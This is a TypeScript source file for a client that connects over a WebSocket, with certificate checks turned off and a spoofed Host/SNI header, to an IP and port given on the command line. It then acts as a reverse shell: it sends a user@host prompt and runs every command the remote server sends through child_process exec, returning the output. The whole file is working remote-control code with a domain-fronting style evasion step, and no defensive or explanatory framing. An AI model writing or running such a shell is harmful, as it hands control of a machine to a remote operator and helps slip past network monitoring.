import WebSocket from 'ws';
import { exec } from 'child_process';
import * as os from 'os';
import * as path from 'path';
import { promisify } from 'util';

const execAsync = promisify(exec);

async function connectWithSNI(ip: string, port: number, sni: string): Promise<void> {
    return new Promise((resolve, reject) => {
        const ws = new WebSocket(`wss://${ip}:${port}/ws`, {
            rejectUnauthorized: false,
            headers: {
                'Host': sni
            }
        });

        ws.on('open', async () => {
            console.log(`Connected to ${ip} with SNI: ${sni}`);

            // Get system information for prompt
            const hostname = os.hostname();
            const username = process.env.USER || process.env.USERNAME || 'user';
            let currentDir = process.cwd();

            while (true) {
                try {
                    // Send prompt
                    const prompt = `\n${username}@${hostname}:${currentDir} $ `;
                    ws.send(prompt);

                    // Wait for command
                    const command = await new Promise<string>((resolve) => {
                        ws.once('message', (data) => resolve(data.toString()));
                    });

                    if (!command) continue;

                    // Handle cd command specially
                    if (command.startsWith('cd ')) {
                        const newDir = command.slice(3).trim();
                        try {
                            process.chdir(newDir);
                            currentDir = process.cwd();
                            ws.send(`Changed directory to: ${currentDir}\n`);
                        } catch (err) {
                            ws.send(`${err}\n`);
                        }
                        continue;
                    }

                    // Execute command
                    try {
                        const { stdout, stderr } = await execAsync(command, { cwd: currentDir });
                        ws.send(stdout + stderr || '\n');
                    } catch (err: any) {
                        ws.send(`Error executing command: ${err.message}\n${err.stdout || ''}${err.stderr || ''}`);
                    }
                } catch (err) {
                    console.error('Error in command loop:', err);
                    break;
                }
            }
        });

        ws.on('close', () => {
            console.log('Server ended connection');
            resolve();
        });

        ws.on('error', (err) => {
            reject(err);
        });
    });
}

async function main() {
    console.log("TypeScript client started");

    if (process.argv.length !== 5) {
        console.log("Usage: ts-node client.ts <target_ip> <target_port> <sni_value>");
        process.exit(1);
    }

    const [,, targetIP, targetPort, sniValue] = process.argv;

    try {
        await connectWithSNI(targetIP, parseInt(targetPort), sniValue);
    } catch (error) {
        console.error('Connection failed:', error);
    }
}

main();